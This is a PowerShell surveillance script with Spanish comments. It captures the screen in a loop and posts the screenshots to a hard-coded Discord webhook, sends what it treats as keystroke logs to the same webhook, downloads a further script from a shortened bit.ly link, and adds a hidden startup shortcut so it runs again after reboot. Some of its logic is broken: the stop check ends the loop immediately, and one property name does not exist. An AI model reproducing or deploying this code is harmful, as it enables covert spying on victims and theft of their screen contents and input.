# Definir la URL del webhook de Discord
$dc = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"
$hookurl = $dc

# Definir el intervalo de tiempo entre capturas de pantalla en segundos
$seconds = 30

# Comando para detener el bucle principal
$stopCommand = "stop"

# shortened URL Detection
if ($hookurl.Ln -ne 121){
    Write-Host "Shortened Webhook URL Detected.." 
    $hookurl = (irm $hookurl).url
}

# Función para enviar las pulsaciones del teclado al webhook de Discord
function SendKeystrokesToDiscord {
    # Obtener el registro de pulsaciones de teclado
    $keystrokes = Get-WinEvent -FilterHashtable @{LogName='Application';ID=13} | Select-Object -ExpandProperty Message

    # Crear el cuerpo de la solicitud
    $body = @{
        content = $keystrokes
    } | ConvertTo-Json

    # Enviar las pulsaciones del teclado al webhook de Discord
    Invoke-WebRequest -Uri $hookurl -Method Post -Body $body -ContentType "application/json"
}

# Bucle principal: tomar dos capturas de pantalla cada 30 segundos y enviarlas al webhook de Discord
While ($true){
    # Verificar si se ha ingresado el comando de detención
    if ($stopCommand -eq "stop") {
        break
    }

    # Definir la ruta y el nombre de archivo para la captura de pantalla
    $file1 = "$env:temp\SC1_$(Get-Date -Format "yyyyMMdd_HHmmss").png"
    $file2 = "$env:temp\SC2_$(Get-Date -Format "yyyyMMdd_HHmmss").png"
    
    # Tomar la primera captura de pantalla
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($file1, [System.Drawing.Imaging.ImageFormat]::png)
    
    # Verificar si la primera captura de pantalla se guardó correctamente
    if (Test-Path $file1) {
        Write-Host "Primera captura de pantalla guardada correctamente en $file1"
    }
    else {
        Write-Host "Error al guardar la primera captura de pantalla en $file1"
    }

    # Esperar un segundo antes de tomar la segunda captura de pantalla
    Start-Sleep -Seconds 1
    
    # Tomar la segunda captura de pantalla
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($file2, [System.Drawing.Imaging.ImageFormat]::png)
    
    # Verificar si la segunda captura de pantalla se guardó correctamente
    if (Test-Path $file2) {
        Write-Host "Segunda captura de pantalla guardada correctamente en $file2"
    }
    else {
        Write-Host "Error al guardar la segunda captura de pantalla en $file2"
    }
    
    # Enviar ambas capturas de pantalla al webhook de Discord si los archivos existen
    if (Test-Path $file1 -and Test-Path $file2) {
        Invoke-WebRequest -Uri $hookurl -Method Post -InFile $file1 -InFile $file2
    }
    else {
        Write-Host "Uno o ambos archivos de captura de pantalla no existen."
    }
    
    # Eliminar las capturas de pantalla después de enviarlas
    Remove-Item -Path $file1
    Remove-Item -Path $file2
    
    # Descargar el script y guardarlo como "sys2.ps1" en la carpeta de documentos
    $scriptURL = "http://bit.ly/screen_dc"
    $scriptPath = Join-Path -Path $env:USERPROFILE -ChildPath "Documents\sys2.ps1"
    Invoke-WebRequest -Uri $scriptURL -OutFile $scriptPath
    
    # Enviar las pulsaciones del teclado al webhook de Discord cada 10 minutos
    Start-Sleep -Seconds 600
    SendKeystrokesToDiscord
}

# Obtener la carpeta de inicio del usuario actual
$startupFolder = [Environment]::GetFolderPath("Startup")

# Ruta completa del script en la carpeta de inicio
$scriptInStartupScriptPath = Join-Path -Path $startupFolder -ChildPath "sys2.ps1"

# Crear un objeto Shell.Application
$shell = New-Object -ComObject WScript.Shell

# Crear el acceso directo del script en la carpeta de inicio
$shortcut = $shell.CreateShortcut("$scriptInStartupScriptPath.lnk")
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-WindowStyle Hidden -File $scriptInStartupScriptPath"
$shortcut
